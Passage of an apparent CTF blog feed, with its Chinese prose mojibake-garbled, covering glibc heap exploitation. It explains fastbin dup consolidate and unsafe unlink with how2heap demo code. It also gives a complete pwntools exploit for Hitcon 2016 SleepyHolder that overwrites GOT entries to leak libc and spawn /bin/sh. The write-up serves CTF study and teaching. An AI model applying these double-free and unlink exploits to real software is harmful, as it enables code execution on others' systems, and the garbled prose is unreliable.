  </entry>
  
  
  
  <entry>
    <title>fastbin dup consolidate</title>
    <link href="/2023/01/29/fastbin-dup-consolidate/"/>
    <url>/2023/01/29/fastbin-dup-consolidate/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªç®€å•çš„fastbin dup consolidate Uâ€¢ã‚§â€¢*U</p><span id="more"></span><h1 id="ç›¸å…³è¿‡ç¨‹"><a href="#ç›¸å…³è¿‡ç¨‹" class="headerlink" title="ç›¸å…³è¿‡ç¨‹"></a>ç›¸å…³è¿‡ç¨‹</h1><p>mallocçš„è¿‡ç¨‹ä¸­å¦‚æœchunkå±äºlarge binï¼Œé‚£ä¹ˆä¼šè®¡ç®—large binçš„indexå¹¶ä¸”è°ƒç”¨malloc_consolidateæ•´ç†fastbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>  &#123;<br>    idx = largebin_index (nb);<br>    <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>      malloc_consolidate (av);<br>  &#125;<br></code></pre></td></tr></table></figure><p>malloc_consolidateä¼šæ•´ç†fastbinä¸­çš„chunkï¼Œèƒ½åˆå¹¶çš„åˆå¹¶ç„¶åæ”¾è¿›unsorted binã€‚åœ¨ä¹‹åçš„éå†unsorted binçš„è¿‡ç¨‹ä¸­åˆä¼šæŠŠchunkæ”¾è¿›small bin<br>ç”±äºfreeä¸€ä¸ªå±äºfastbinçš„chunkæ—¶ä¸æ£€æŸ¥nextchunkçš„preinuseä½ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ double free</p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-26ä»¥ä¸‹"><a href="#2-26ä»¥ä¸‹" class="headerlink" title="2.26ä»¥ä¸‹"></a>2.26ä»¥ä¸‹</h2><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br>  <span class="hljs-type">void</span>* p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now free p1!\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br><br>  <span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Trigger the double free vulnerability!\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆå®éªŒç¯å¢ƒ2.23ï¼‰   </p><ul><li>ç¬¬ä¸€æ¬¡free(p1)<img src="/2023/01/29/fastbin-dup-consolidate/1.png" class title="æ­¥éª¤ä¸€"></li><li>malloc(0x400)è§¦å‘malloc_consolidate<img src="/2023/01/29/fastbin-dup-consolidate/2.png" class title="æ­¥éª¤äºŒ"></li><li>ç¬¬äºŒæ¬¡free(p1)<img src="/2023/01/29/fastbin-dup-consolidate/3.png" class title="æ­¥éª¤ä¸‰"></li></ul><h2 id="2-26ä»¥ä¸Š"><a href="#2-26ä»¥ä¸Š" class="headerlink" title="2.26ä»¥ä¸Š"></a>2.26ä»¥ä¸Š</h2><p>éœ€è¦å…ˆå¡«æ»¡tcacheï¼Œå…¶ä»–ä¸€æ ·</p><h1 id="ä¾‹é¢˜Hitcon-2016-SleepyHolder"><a href="#ä¾‹é¢˜Hitcon-2016-SleepyHolder" class="headerlink" title="ä¾‹é¢˜Hitcon 2016 SleepyHolder"></a>ä¾‹é¢˜Hitcon 2016 SleepyHolder</h1><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>é’ˆä¸æˆ³~æœ‰æºç <br>delå‡½æ•°æ²¡æœ‰æ£€æŸ¥æ˜¯å¦å·²ç»delï¼Œå¯ä»¥double free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">int</span> choice;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which Secret do you want to wipe?&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Small secret&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Big secret&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    choice = atoi(buf);<br><br>    <span class="hljs-keyword">switch</span>(choice)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">free</span>(f_ptr);<br>            f_flag = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">free</span>(s_ptr);<br>            s_flag = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ€è·¯ï¼ˆfastbin-dup-consolidate-unlinkï¼‰"><a href="#æ€è·¯ï¼ˆfastbin-dup-consolidate-unlinkï¼‰" class="headerlink" title="æ€è·¯ï¼ˆfastbin_dup_consolidate+unlinkï¼‰"></a>æ€è·¯ï¼ˆfastbin_dup_consolidate+unlinkï¼‰</h2><p>è¿™é“é¢˜å±•ç¤ºäº†fastbin_dup_consolidateçš„ä¸€ä¸ªä½œç”¨ï¼Œå°±æ˜¯å¯ä»¥åœ¨ä½¿ç”¨chunkæ—¶åŒæ—¶è®©nextchunkçš„preinuseä½ä¸º0ï¼Œè¾…åŠ©unlink   </p><ul><li>å…ˆaddä¸€ä¸ªsmall secretå†addä¸€ä¸ªbig secret</li><li>å¯¹small secretè¿›è¡Œfastbin dup consolidate</li><li>åœ¨small secreté‡Œå¸ƒç½®fake chunkï¼Œç„¶ådelete big secretè§¦å‘unlink<br>psï¼šè¿™ä¸ªæ—¶å€™å¦‚æœä½¿ç”¨gdb heapå‘½ä»¤ä¼šå¾ˆå¥‡æ€ªï¼Œtop chunkæ²¡äº†<img src="/2023/01/29/fastbin-dup-consolidate/heap1.png" class title="heap1">å…¶å®big secretå’Œsmall secreté‡Œçš„fake chunkéƒ½æ”¶è¿›top chunké‡Œäº†ï¼Œçœ‹fake chunkçš„å¤§å°å°±èƒ½çœ‹å‡ºæ¥<img src="/2023/01/29/fastbin-dup-consolidate/heap2.png" class title="heap2">æˆ–è€…çœ‹main_arenaä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼Œmain_arena+88å­˜çš„å°±æ˜¯top chunkçš„åœ°å€<img src="/2023/01/29/fastbin-dup-consolidate/heap3.png" class title="heap3">pssï¼šä¹‹åçš„è¿‡ç¨‹å¯èƒ½ä¼šæœ‰ç‚¹ç»•o(Tãƒ˜To)</li><li>unlinkç»“æŸåå‡ ä¸ªå­˜secretçš„å†…å­˜æ˜¯è¿™æ ·çš„<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">big_secret-&gt; big_chunk<br>huge_secret-&gt; huge_chunk<br>small_secret-&gt; small_secret<span class="hljs-number">-0x18</span><br></code></pre></td></tr></table></figure></li><li>add small secretå‘small_secret-0x18å†™payload<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   b<span class="hljs-number">&#x27;b</span>bbbbbbb<span class="hljs-number">&#x27;</span><br>big_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>huge_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>small_secret-&gt; got[<span class="hljs-string">&#x27;free&#x27;</span>]-&gt; free_addr<br></code></pre></td></tr></table></figure></li><li>update small secretå‘got[â€˜freeâ€™]å†™plt[â€˜putsâ€™]<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   b<span class="hljs-number">&#x27;b</span>bbbbbbb<span class="hljs-number">&#x27;</span><br>big_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>huge_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>small_secret-&gt; got[<span class="hljs-string">&#x27;free&#x27;</span>]-&gt; plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br></code></pre></td></tr></table></figure></li><li>ä¹‹åæ‰§è¡Œdelete(big_secret)æ—¶å®é™…æ‰§è¡Œçš„å°±æ˜¯puts(got[â€˜atoiâ€™])ï¼Œæ­¤æ—¶atoiå·²ç»æ‰§è¡Œè¿‡æ‰€ä»¥gotè¡¨é‡Œæ”¾çš„åº”è¯¥å°±æ˜¯atoiçš„åœ°å€ï¼Œå‡å»åç§»å¯ä»¥ç®—å‡ºlibcåŸºå€</li><li>å†update small secretå‘got[â€˜freeâ€™]å†™system_addr<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   b<span class="hljs-number">&#x27;b</span>bbbbbbb<span class="hljs-number">&#x27;</span><br>big_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>huge_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>small_secret-&gt; got[<span class="hljs-string">&#x27;free&#x27;</span>]-&gt; system_addr<br></code></pre></td></tr></table></figure></li><li>add big secretå‘got[â€˜atoiâ€™]å†™bâ€™&#x2F;bin&#x2F;sh\x00\x00â€™<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   b<span class="hljs-number">&#x27;b</span>bbbbbbb<span class="hljs-number">&#x27;</span><br>big_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; b<span class="hljs-number">&#x27;</span>/bin/sh\x00\x00<span class="hljs-number">&#x27;</span><br>huge_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>small_secret-&gt; got[<span class="hljs-string">&#x27;free&#x27;</span>]-&gt; system_addr<br></code></pre></td></tr></table></figure></li><li>å†delete(big_secret)æ—¶å®é™…æ‰§è¡Œçš„å°±æ˜¯system(got[â€˜atoiâ€™])ï¼Œè€Œgot[â€˜atoiâ€™]è¿™æ—¶å­˜çš„æ˜¯bâ€™&#x2F;bin&#x2F;sh\x00\x00â€™ï¼Œå®é™…æ‰§è¡Œçš„å°±æ˜¯system(â€˜&#x2F;bin&#x2F;shâ€™)</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">i,index,secret</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;3. Renew secret\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span>:<br>        p.sendafter(<span class="hljs-string">b&#x27;2. Big secret\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    <span class="hljs-keyword">else</span>:<br>        p.sendafter(<span class="hljs-string">b&#x27;3. Keep a huge secret and lock it forever\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Tell me your secret: \n&#x27;</span>,secret)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;3. Renew secret\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;2. Big secret\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">index,secret</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;3. Renew secret\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;2. Big secret\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Tell me your secret: \n&#x27;</span>,secret)<br><br>p=process(<span class="hljs-string">&#x27;./SleepyHolder&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./SleepyHolder&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x6020d0</span>-<span class="hljs-number">0x18</span>)+p64(<span class="hljs-number">0x6020d0</span>-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,payload)<br>delete(<span class="hljs-number">2</span>)<br>gdb.attach(p)<br>payload=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])*<span class="hljs-number">2</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>update(<span class="hljs-number">1</span>,payload)<br>update(<span class="hljs-number">1</span>,p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>delete(<span class="hljs-number">2</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-libc.symbols[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>update(<span class="hljs-number">1</span>,p64(system_addr))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\x00&#x27;</span>)<br>delete(<span class="hljs-number">2</span>)<br>p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unsafe unlink</title>
    <link href="/2023/01/29/unsafe-unlink/"/>
    <url>/2023/01/29/unsafe-unlink/</url>
    
    <content type="html"><![CDATA[<p>unlinkæ¥å–½ï¼åˆšå¼€å§‹çœ‹çš„æ—¶å€™æœ‰ç‚¹æ‘¸ä¸ç€å¤´è„‘ï¼Œç†é¡ºäº†è¿˜æ˜¯æŒºå½¢è±¡çš„(à¸‡ â€¢_â€¢)à¸‡</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>unlinkå®é™…ä¸Šæ˜¯ä¸€ä¸ªå®ï¼Œç”¨äºä»åŒé“¾ä¸­æ‘˜ä¸‹chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    FD = P-&gt;fd;      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;      \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;      \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="hljs-meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">      malloc_printerr (check_action,      \</span><br><span class="hljs-meta">       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">       P, AV);      \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="hljs-meta">                  &#125;      \</span><br><span class="hljs-meta">              &#125; <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">              &#125;      \</span><br><span class="hljs-meta">          &#125;      \</span><br><span class="hljs-meta">      &#125;      \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure><p>æ‘˜ä¸‹chunkçš„è¿‡ç¨‹å¯å¦‚å›¾æ‰€ç¤ºï¼š</p><img src="/2023/01/29/unsafe-unlink/unlink.png" class title="unlink"><p>ç®€åŒ–ä¸€ä¸‹å…¶å®å°±æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">FD=victim-&gt;fd<br>BK=victim-&gt;bk<br>FD-&gt;bk=BK<br>BK-&gt;fd=FD<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šæ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FD-&gt;bk != P || BK-&gt;fd != P<br></code></pre></td></tr></table></figure><p>2.26unlinkå¼€å¤´å¢åŠ äº†å¯¹nextchunkçš„presizeå’Œsizeçš„æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta"><span class="hljs-comment">//sizeå’Œnext chunkçš„presizeçš„æ£€æŸ¥</span></span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \<br>    FD = P-&gt;fd;      \<br>    BK = P-&gt;bk;      \<br><br>â€¦â€¦<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼Œåˆ é™¤äº†ä¸€äº›è¾“å‡ºï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <br><span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br>chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br><span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br><br>chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br><br><span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br><br>chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br><br>chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br><span 